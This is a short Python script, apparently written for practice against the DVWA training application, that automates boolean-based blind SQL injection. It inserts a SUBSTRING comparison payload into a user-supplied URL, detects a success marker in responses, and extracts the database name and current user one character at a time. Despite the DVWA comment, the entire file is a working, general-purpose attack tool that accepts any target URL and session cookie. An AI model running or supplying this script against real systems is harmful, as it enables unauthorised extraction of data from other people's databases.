import requests as req
import string
import sys

def requestador(letra,busqueda,numero):
    cookies = dict(PHPSESSID=coockieImput,security='low') # security low para DVWA unicamente
   # print(url)
    url2 = url[0:url.index("<Inject>")] + "1\' and SUBSTRING(" +busqueda+ ","+ str(numero) + ",1) = \"" + letra  + "\" -- -"
    url3 = url[url.index("<Inject>") + 8: ]
    urlCrafteado = url2 + url3
    r = req.get(urlCrafteado, cookies=cookies)

    #print(urlCrafteado)
    return r.text


def ysisi(webpage):

    res = webpage.find(comprobador)

    if res != -1:
        return True
    return False

def takataka(seleccionador):
    dictionary = string.ascii_lowercase
    dictionary += '1234567890'
    result = ""
    i = 1
    flag = False

    while flag is False:
        for item in dictionary:
            siono = ysisi(requestador(item, seleccionador, i))
            if siono:
                result += item
                i += 1
                break
            if item == '0' and siono is False:
                flag = True
                break
    return result

def banner():
    print("usage: sqliblind.py <url> <succase_identifier> <coockie>")
    print("Only works in boolena based char input blind SQLI")
    print("parameters with value <Inject> will be injected")
def main():
    global url
    global comprobador
    global coockieImput
    if(len(sys.argv) < 3):
	banner()
    else:
	url = sys.argv[1]
	comprobador = sys.argv[2]
	coockieImput = sys.argv[3]
        print("Database: "+ takataka("database()"))
        print("Usuario: "+ takataka("user()"))

main()
